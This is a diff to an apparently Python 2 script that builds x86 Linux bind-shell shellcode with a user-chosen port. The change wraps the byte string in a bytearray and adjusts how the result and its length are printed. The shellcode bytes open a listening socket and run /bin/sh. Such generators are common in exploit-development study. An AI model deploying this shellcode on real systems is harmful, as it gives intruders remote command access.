@@ -45,7 +45,7 @@ else:
     
     	print "\nShellcode-ready port: " + shellport
     
-    	shellcode = ("\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x31\\xf6"+
+    	shellcode = bytearray("\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x31\\xf6"+
     	"\\x56\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80"+
     	"\\x5f\\x97\\x93\\xb0\\x66\\x56\\x66\\x68"+
     	shellport+"\\x66\\x53\\x89\\xe1\\x6a\\x10"+
@@ -57,9 +57,9 @@ else:
     	"\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62"+
     	"\\x69\\x6e\\x89\\xe3\\x41\\x89\\xca\\xcd"+
     	"\\x80")
-    
-    	print "\nFinal shellcode:\n" + shellcode + "\""
- 
+
+    	print "\nFinal shellcode:\n" + "\"" + shellcode + "\""
+        print "Shellocde length is: " + str(len(shellcode)/4)
     except:
         print "Something went wrong - exiting..."
 
